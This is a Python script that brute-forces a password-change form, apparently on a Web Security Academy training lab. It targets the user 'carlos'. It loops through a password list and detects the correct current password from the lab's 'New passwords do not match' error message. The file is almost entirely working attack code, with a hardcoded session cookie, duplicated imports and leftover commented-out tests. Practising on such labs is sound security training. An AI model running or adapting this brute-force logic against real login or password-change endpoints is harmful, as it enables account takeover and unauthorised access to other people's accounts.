import requests
from rich.console import Console
from rich.text import Text
from rich.theme import Theme
import base64 


import hashlib


custom_theme = Theme({
    "info": "dim cyan",
    "warning": "magenta",
    "danger": "bold red"
})
console= Console(theme=custom_theme)

"""usernames_file= open('hashed_pass.txt', 'r')
lines = usernames_file.readlines()

for line in lines:
    print('carlos:'+line)

"""

import requests
from rich.console import Console
from rich.text import Text
from rich.theme import Theme
custom_theme = Theme({
    "info": "dim cyan",
    "warning": "magenta",
    "danger": "bold red"
})
console= Console(theme=custom_theme)

password_file= open('passwords.txt', 'r')
lines = password_file.readlines()

URL = "https://0ab100c103cc6200812220950093005a.web-security-academy.net/my-account/change-password"

status = console.status(status="[bold green] password change brute-forcing", spinner='circle')

status.start()
usernames = []



for line in lines:
    data= {'username' : 'carlos',
              'current-password': line.strip(),
              'new-password-1' : 'aaa',
              'new-password-2': 'bbbcc'}
    cookies={
        'session': 'gENhz0dzbz9WFLIjWobQAGdrDoCcNDFV'
    }
   

    response = requests.post(url=URL, data=data, cookies=cookies)
    #print(response.text)
    #print(response.content)
    if "New passwords do not match" in response.text:
        status.stop()
        console.print('password obtained', style='warning')
        console.print(line)
        console.print('the new one is aaa')
        break
    
    
            

    
status.stop()
"""
data = {
        'username' : 'carlos',
        'password' : 'line.strip()'
    }
response = requests.post(url=URL, data=data)
print(response.status_code)

print(str(response.text))

print()
print()

data = {
        'username' : 'wiener',
        'password' : 'peter'
    }
response = requests.post(url=URL, data=data)
print(response.status_code)
print(str(response.text))

"""